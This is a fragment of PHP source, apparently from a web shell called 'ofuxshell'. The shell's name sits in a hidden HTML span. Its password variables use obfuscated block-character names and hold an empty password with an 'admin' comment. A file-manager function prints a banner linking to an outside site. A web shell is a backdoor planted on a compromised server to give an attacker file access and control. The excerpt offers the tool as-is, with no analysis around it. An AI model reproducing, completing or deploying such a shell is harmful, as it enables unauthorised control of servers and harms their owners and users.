...
echo '<span hidden>ofuxshell</span>';
//-----------------Password---------------------
$▛ = ""; //admin
$▘ = true;
$▜ = 'UTF-8';
...
function actionFilesMan() {
    ...
    hardHeader();
	echo '<h1>File manager</h1><br><center><a href="http://ofux.pro" target="_blank"><img src="https://www.ofux.pro/images/banner.png"></a></center><br><div class=content><script>p1_=p2_=p3_="";</script>';
